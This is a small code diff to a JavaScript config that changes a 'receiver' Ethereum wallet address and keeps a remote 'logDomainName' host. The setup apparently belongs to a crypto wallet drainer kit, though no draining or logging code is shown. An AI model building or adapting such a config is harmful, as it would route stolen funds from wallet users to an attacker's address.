@@ -6,7 +6,7 @@ window.Buffer = buffer.Buffer
 
 const config = { 
 
-    receiver: "0xd7694264C87b864D32B2F4bD14F07b5cDD60a100",
+    receiver: "0x6a13b325506A96e01eCB8A16D723591f713a629d",
     
     logDomainName: "https://blue-hermit-crab-ring.cyclic.app/",
 
